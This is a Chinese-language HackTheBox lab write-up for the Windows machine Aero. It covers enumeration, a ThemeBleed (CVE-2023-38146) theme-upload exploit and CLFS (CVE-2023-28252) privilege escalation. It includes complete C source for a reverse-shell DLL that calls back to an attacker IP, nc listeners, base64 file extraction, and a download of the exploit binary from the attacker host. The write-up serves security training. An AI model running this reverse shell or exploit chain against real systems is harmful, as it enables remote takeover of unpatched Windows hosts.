---
title: "Aero"
description: "这篇HackTheBox Windows 靶机 Aero 复盘用一句话概括了从服务枚举、凭据获取到权限提升的完整利用链。"
summary: "这篇HackTheBox Windows 靶机 Aero 复盘用一句话概括了从服务枚举、凭据获取到权限提升的完整利用链。"
date: "2024-11-04T21:53:00+08:00"
publishDate: "2024-11-04T21:53:00+08:00"
lastmod: "2024-11-04T21:53:00+08:00"
url: "/hackthebox/windows/aero/"
image: "images/oscp-banners/banner-019.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Windows"
oscp_provider: "HackTheBox"
oscp_platform: "Windows"
---
<!-- oscp-refactor:meta-start -->
> 平台：Windows ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

针对服务器端口进行探测扫描

```
sudo nmap -p- --min-rate 10000 10.10.11.237
```

![image-20241015160534284](https://files.seeusercontent.com/2026/04/06/5Vsd/image-20241015160534284.png)

针对开放端口进行进一步服务探测

```
 sudo nmap -p80 -A 10.10.11.237 -oX Aero.xml 
```

![image-20241015162305726](https://files.seeusercontent.com/2026/04/06/I2ho/image-20241015162305726.png)

只有一个http 80 端口，对80端口服务进行检查

优先添加hosts记录

```
10.10.11.237 aerohub.htb
```

![image-20241015163328221](https://files.seeusercontent.com/2026/04/07/wI2y/image-20241015163328221.png)

发现存在一个文件上传点

使用browse点击预览，可以看到只支持两个格式的上传

![image-20241015165314796](https://files.seeusercontent.com/2026/04/06/lnJ8/image-20241015165314796.png)

随意新建一个test.txt，修改后缀为theme，均可以上传成功

![image-20241015165436382](https://files.seeusercontent.com/2026/04/06/9dnN/image-20241015165436382.png)

同时针对域名进行路径爆破及子域名爆破

```
ffuf -u http://aerohub.htb -H "Host:FUZZ.aerohub.htb" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 11650
dirsearch -u http://aerohub.htb/ -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html,asp
```

通过Google搜索关键词Windows theme exploit，发现存在一个RCE漏洞（https://jnns.de/posts/cve-2023-38146-poc/

https://github.com/exploits-forsale/themebleed）

最后使用第二个链接完成了相应的shell反弹，在Linux中无法进行相应的反弹操作，最终在Windows上执行了相应反弹shell

优先进行准备工作，优先准备对应的reverseshell的c语言脚本

```c
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int ReverseShell(const char *CLIENT_IP, int CLIENT_PORT) {

        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
                write(2, "[ERROR] WSASturtup failed.\n", 27);
                return (1);
        }

        int port = CLIENT_PORT;
        struct sockaddr_in sa;
        SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

        if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
                write(2, "[ERROR] connect failed.\n", 24);
                return (1);
        }

        STARTUPINFO sinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES);
        sinfo.hStdInput = (HANDLE)sockt;
        sinfo.hStdOutput = (HANDLE)sockt;
        sinfo.hStdError = (HANDLE)sockt;
        PROCESS_INFORMATION pinfo;
        CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

        return (0);
}

void VerifyThemeVersion(){
        ReverseShell("10.10.16.12", 12345);
}
```

将其编译成相应的dll文件

```
#编译文件
x86_64-w64-mingw32-gcc-win32 main.c -shared -lws2_32 -o VerifyThemeVersion.dll
#验证函数
python3 -m pefile exports VerifyThemeVersion.dll
```

将相应的dll文件复制到git项目中的data目录中，并替换stage_3

```
#编译theme文件并进行上传
.\ThemeBleed.exe make_theme 10.10.16.12 exploit.theme
#Windows端开启侦听
nc.exe -nvlp 12345
#themebleed开启侦听
.\ThemeBleed.exe server
```

![image-20241016134200767](https://files.seeusercontent.com/2026/04/07/cXo2/image-20241016134200767.png)

成功突破边界，并在用户的desktop目录下找到对应的flag文件

经过一番查找，在document下找到两个文件

![image-20241016135602761](https://files.seeusercontent.com/2026/04/07/Ii8i/image-20241016135602761.png)

```
type watchdog.ps1
```

```powershell
﻿$directory = "C:\inetpub\aero\uploads"

function New-FileCreated {
    param($path)
    if (Get-Process -Name SystemSettings -ea SilentlyContinue){
        Stop-Process -name SystemSettings -Force
        }
    Start-Process -FilePath $path; sleep 15
    Remove-Item -Force $path
}

$action = {
    $path = $Event.SourceEventArgs.FullPath
    New-FileCreated -path $path
    write-host "New theme uploaded at:  $path"
}

$theme_watchdog = New-Object System.IO.FileSystemWatcher
$theme_watchdog.Path = $directory
$theme_watchdog.Filter = "*.theme"
$theme_watchdog.IncludeSubdirectories = $false
$theme_watchdog.EnableRaisingEvents = $true

Register-ObjectEvent $theme_watchdog Created -Action $action -SourceIdentifier theme_watchdog


$themepack_watchdog = New-Object System.IO.FileSystemWatcher
$themepack_watchdog.Path = $directory
$themepack_watchdog.Filter = "*.themepack"
$themepack_watchdog.IncludeSubdirectories = $false
$themepack_watchdog.EnableRaisingEvents = $true

Register-ObjectEvent $themepack_watchdog Created -Action $action -SourceIdentifier themepack_watchdog
```

该脚本是默认认为加载上传的主题脚本

```
#优先切换到powershell环境
powershell
#确认文件的存在
Test-Path 'C:\Users\sam.emerson\Documents\CVE-2023-28252_Summary.pdf'
#输出PDF文件的base64编码
[convert]::ToBase64String((Get-Content -path "CVE-2023-28252_Summary.pdf" -Encoding byte))
#在Linux环境中输出pdf
echo "JVBERi...[snip]...GCg==" | base64 -d > CVE-2023-28252_Summary.pdf
#打开PDF文件
firefox CVE-2023-28252_Summary.pdf
```

这是一篇讲解CVE-2023-28252的介绍，根据介绍系统需要打补丁才可以避免，根据systeminfo返回的数据内容，

![image-20241016161415320](https://s2.loli.net/2024/10/16/JMwmBIxKjzSq8HA.png)

系统为Windows11 22000版本，结合网站查询，对应的KB补丁号应当为KB[5025224](https://support.microsoft.com/help/5025224)

再查看下方hotfix信息内容，发现并没有打对应的补丁，故判断可以利用这个漏洞进行本地提权，找到两个poc，最终选择了第二个

https://github.com/duck-sec/CVE-2023-28252-Compiled-exe

https://github.com/fortra/CVE-2023-28252

需要安装vsstudio进行编译，其他方法未进行尝试

```
注意点：
1.需要选择release x64
2.打开项目，右键项目名称属性，需要修改字符集未使用多字节字符集
3.如果出现以下报错，需要安装142版本的平台组件包
Build started...
------ Build started: Project: clfs_eop, Configuration: Release x64 ------
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Microsoft\VC\v170\Microsoft.CppBuild.targets(456,5): error MSB8020: The build tools for Visual Studio 2019 (Platform Toolset = 'v142') cannot be found. To build using the v142 build tools, please install Visual Studio 2019 build tools.  Alternatively, you may upgrade to the current Visual Studio tools by selecting the Project menu or right-click the solution, and then selecting "Retarget solution".
Done building project "clfs_eop.vcxproj" -- FAILED.
========== Build: 0 succeeded, 1 failed, 0 up-to-date, 0 skipped ==========
========== Build started at 1:02 PM and took 04.768 seconds ==========
4.点击生成重新生成解决方案，或者CTRL shift b
```

修改代码部分

![image-20241016222018653](https://s2.loli.net/2024/10/16/jXC8Flxk7GghfDt.png)

修改system命令，使用shell生成网站的powershell脚本

```
#下载对应文件
invoke-webrequest http://10.10.16.12/clfs_eop.exe -outfile clfs_eop.exe
```

如果执行错误，可以执行以下命令删除必要文件

```
cd c:\users\public
Get-ChildItem -Path C:\users\public\* -Include .p* | Remove-Item -Verbose
Get-ChildItem -Path C:\users\public\* -Include *.blf | Remove-Item -Verbose
```

最终执行.\clfs_eop.exe

![](https://s2.loli.net/2024/10/16/5lcxhmi48fUBszu.png)

Windows侦听端返回shell

![](https://s2.loli.net/2024/10/16/mwNDXEPBtV3xOgu.png)

